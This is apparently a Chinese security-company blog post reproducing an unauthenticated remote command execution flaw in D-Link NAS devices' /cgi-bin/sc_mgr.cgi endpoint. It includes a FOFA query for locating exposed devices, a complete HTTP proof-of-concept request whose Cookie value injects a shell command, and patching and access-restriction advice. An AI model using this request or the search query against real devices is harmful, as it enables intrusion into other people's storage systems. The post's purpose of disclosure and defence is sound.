#  【漏洞复现】D-Link NAS设备 sc_mgr.cgi 未授权RCE漏洞复现   
河北镌远  河北镌远网络科技有限公司   2024-11-19 09:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5xic9OHsHiafbUVg4naibSQnNsuMVRYqdlLLzHovhH9jcrrEaj6ia94y9TTpBJTlQDQBcgwMczFq8BRURR9fJIdeLg/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz/UC6M1Hf0SSEpr1lbbiatiaxPJc8y9JcOeRyJOIhsibwSxWPmHCqJwzWX8xTMz9MYLpHKAkRfY2fcMqovyxrR9KpAw/640?wx_fmt=gif "")  
  
点击箭头处  
“蓝色字”  
，关注我们哦！！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055InLbQBxQeyfaAH2kmQuoQY9qyfWrNl3Fv4lJibwUiaVNWV2Ic1PCZAXg/640?wx_fmt=png&from=appmsg "")  
  
**产品简介**  
  
  
**D-Link NAS设备是一种基于网络的存储解决方案，作为网络存储设备，旨在为企业提供大容量的存储空间，并通过网络连接实现数据的访问和管理。**这种设备不仅满足了企业对数据存储的需求，还提供了高效的数据共享和访问功能，提升了企业数据管理的效率和灵活性。广泛应用于各种企业场景，如文档存储、图片和视频存储、数据库备份等。特别是在需要高效数据共享和访问的企业环境中，如设计工作室、广告公司、医疗机构等，D-Link NAS设备更是发挥了其强大的功能和优势。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055InLbQBxQeyfaAH2kmQuoQY9qyfWrNl3Fv4lJibwUiaVNWV2Ic1PCZAXg/640?wx_fmt=png&from=appmsg "")  
  
**漏洞概述**  
  
  
**D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055InLbQBxQeyfaAH2kmQuoQY9qyfWrNl3Fv4lJibwUiaVNWV2Ic1PCZAXg/640?wx_fmt=png&from=appmsg "")  
  
**复现环境**  
  
  
**FOFA：**  
  
body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055Zib4UiaWnmiabdT13qYlQtGwTtqJrUDfDW63gowTzNKSq6I2F6pcJtLCQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafbhCXSibBQ5mxzJzh4MA1GHjBHU32knsQ5FES2E2micLW3gRfCNQfEa2o7YfjYKwiaiaebvHHorvuzosA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055InLbQBxQeyfaAH2kmQuoQY9qyfWrNl3Fv4lJibwUiaVNWV2Ic1PCZAXg/640?wx_fmt=png&from=appmsg "")  
  
**漏洞复现**  
  
  
**PoC**  
  
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1  
  
**Host:**  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0  
  
**Accept: */***  
  
Accept-Encoding: gzip, deflate  
  
**Connection: close**  
  
Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055Zib4UiaWnmiabdT13qYlQtGwTtqJrUDfDW63gowTzNKSq6I2F6pcJtLCQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafbhCXSibBQ5mxzJzh4MA1GHjnI09ACdNrABVIOJiap3kXhY5DqWbYT0NmKY3csgDcx7d8VbklfTGj8g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWhSVRquL7y9jy4EhPsON055InLbQBxQeyfaAH2kmQuoQY9qyfWrNl3Fv4lJibwUiaVNWV2Ic1PCZAXg/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
  
  
**应用补丁和更新： 用户应下载并安装 D-Link 提供的任何固件更新。**  
  
**限制网络访问： 作为临时措施，对 NAS 管理界面的网络访问应仅限于受信任的 IP 地址。**  
  
**监控固件更新： 受影响的设备用户应密切关注 D-Link 即将提供的任何安全补丁。**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafZBZZ3yiaibiaZCPcv4FLUUkic7Juicamh0zLreL6e2KWZpz8iaeeyEnrmV98VmYN5UibkP0tQQoRz5FAswg/640?wx_fmt=png "")  
  
文章来源：  
网络  
  
公众号“河北镌远网络科技有限公司”所发表内容注明来源的，版权归原出处所有（无法查证版权的或者未注明出处的均来自网络，系转载，转载的目的在于传递更多信息，版权属于原作者。如有侵权，请联系，小编会第一时间删除处理）  
  
  
  
